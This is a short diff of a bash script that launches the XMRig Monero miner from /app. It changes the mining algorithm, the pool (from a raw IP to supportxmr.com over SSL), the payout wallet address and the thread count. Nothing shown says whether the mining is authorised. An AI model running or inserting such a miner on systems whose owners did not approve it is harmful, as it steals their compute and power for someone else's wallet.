@@ -1,10 +1,12 @@
 #!/bin/bash
 cd /app
-./xmrig/xmrig \
-  -a cn/wow \
-  -o stratum+tcp://139.144.193.251:3456 \
-  -u Wo4eVYJsXWT8w8sArwpGUKLQib45J5x2nMgEnjSBw9iWCDhXf64KXtV5oNhRwAokNtfUw1AM9ekoi12SAM8R7C3A1GK2UiDvv \
+./xmrig \
+  -a rx/0 \
+  -o stratum+ssl://pool.supportxmr.com:443 \
+  -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm \
   -p x \
-  --threads 50 \
+  --threads 10 \
   --cpu-priority 0 \
-  --donate-level 0
+  --donate-level 0 \
+  --no-huge-pages \
+  --no-config
